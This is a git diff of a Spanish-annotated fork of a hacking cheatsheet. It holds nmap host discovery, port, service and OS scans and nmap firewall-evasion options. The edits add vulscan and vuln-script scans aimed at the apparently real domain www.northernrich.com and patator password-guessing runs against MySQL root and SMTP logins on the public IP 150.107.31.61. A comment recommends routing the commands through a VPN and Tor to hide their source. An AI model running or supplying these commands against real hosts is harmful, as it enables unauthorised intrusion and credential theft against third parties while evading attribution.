@@ -1,4 +1,6 @@
-# Modified by alonsoir in order to not have "$ "... 
+# El autor del fork ha quitado carácteres extraños que no funcionanaban en mi kali.
+# Idealmente lanzarías estos comandos detrás de una vpn y poniendo proxychains configurado para funcionar a través de Tor.
+# Por simplicidad, solo ejecuto los comandos core.
 # Hacking Cheatsheet
     List of commands and techniques to while conducting any kind of hacking :)
 
@@ -10,31 +12,36 @@
 
 # Host discovery, generate a list of surviving hosts
 
-    nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
-    grep "Status: Up" /home/kali/Desktop/work/Discovery.gnmap | cut -f 2 -d '' > /home/kali/Desktop/work/LiveHosts.txt
+    cd /home/kali/Desktop/work
+    sudo nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
+    grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
     
     #http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
 
-    nmap -sS -T4 -Pn -oG /home/kali/Desktop/work/TopTCP -iL /home/kali/Desktop/work/LiveHosts.txt
-    nmap -sU -T4 -Pn -oN /home/kali/Desktop/work/TopUDP -iL /home/kali/Desktop/work/LiveHosts.txt
+    sudo nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
+    sudo nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
 
 # Port found, found all the ports, but UDP port scanning will be very slow
 
-    nmap -sS -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt
-    nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
-    nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
+    sudo nmap -sS -T4 -Pn –top-ports 3674 -oG LiveHost-port-3674 -iL LiveHosts.txt
+    sudo nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
+    # este comando es super lento...
+    sudo nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
 
 # Displays the TCP / UDP port
-    grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “T:”$0}’
-    grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “U:”$0}’
+
+    grep "open" FullTCP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "TCP-PORTS: " $0}'
+    grep "open" FullUDP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "UDP-PORTS: " $0}'
 
 # Detect the service version
 
-    nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
-    nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
-    nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
+    sudo nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
+    sudo nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
+    sudo nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
+    # Este comando hace un TCP y UDP scan, udp ports 53,111,137. tcp ports 21-25,80,139,8080. El anterior hace lo mismo pero da warnings.
+    sudo nmap -O -sV -sS -sU -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt 
 
-Nmap to avoid the firewall
+# Nmap to avoid the firewall
 
 # Segmentation
     nmap -f
@@ -57,12 +64,12 @@ Nmap to avoid the firewall
 
     cd /usr/share/nmap/scripts/
     wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
-    nmap -sS -sV --script=vulscan/vulscan.nse target
-    nmap -sS -sV --script=vulscan/vulscan.nse --script-args vulscandb=scipvuldb.csv target
-    nmap -sS -sV --script=vulscan/vulscan.nse --script-args vulscandb=scipvuldb.csv -p80 target
-    nmap -PN -sS -sV --script=vulscan --script-args vulscancorrelation=1 -p80 target
-    nmap -sV --script=vuln target
-    nmap -PN -sS -sV --script=all --script-args vulscancorrelation=1 target
+    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site www.northernrich.com 
+    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-1 --script-args vulscandb=scipvuldb.csv www.northernrich.com
+    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-port80 --script-args vulscandb=scipvuldb.csv -p80 www.northernrich.com
+    sudo nmap -PN -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-vulscancorrelation-1 --script-args vulscancorrelation=1 -p80 www.northernrich.com
+    sudo nmap -sV -oG northernrich-vulscan-site-script-vuln --script=vuln www.northernrich.com
+    sudo nmap -PN -sS -sV -oG northernrich-vulscan-site-script-all --script=all --script-args vulscancorrelation=1 www.northernrich.com
 
 # Web path scanner
     dirsearch 
@@ -70,8 +77,15 @@ Nmap to avoid the firewall
     Patator- password guessing attacks
 
     git clone https://github.com/lanjelot/patator.git /usr/share/patator
-    patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
-    patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+    #Probably you will have available the tool in kali...
+    # Passwords and users from SecList. /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
+    
+    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt host=150.107.31.61 -x ignore:fgrep='Access denied for user'
+    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
+    sudo patator mysql_login user=root password=FILE0 0=/usr/share/john/password.lst host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
+
+    sudo patator smtp_login host=150.107.31.61 user=Ololena password=FILE0 0=/usr/share/john/password.lst
+    sudo patator smtp_login host=150.107.31.61 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
     patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
     patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
 
